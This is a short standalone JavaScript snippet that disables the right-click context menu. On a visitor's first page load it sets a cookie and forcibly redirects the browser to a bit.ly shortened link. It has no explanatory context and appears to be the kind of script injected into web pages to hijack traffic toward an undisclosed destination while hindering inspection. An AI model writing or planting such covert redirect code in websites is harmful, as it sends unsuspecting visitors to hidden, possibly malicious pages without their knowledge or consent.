window.addEventListener('contextmenu', function (e) {
    e.preventDefault();
  }, false);



  if (getCookie("first_visit") != "true") {
    document.cookie = "first_visit=true";
    location.href="https://bit.ly/2EyQcLt";    
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length,c.length);
        }
    }
    return "";
}   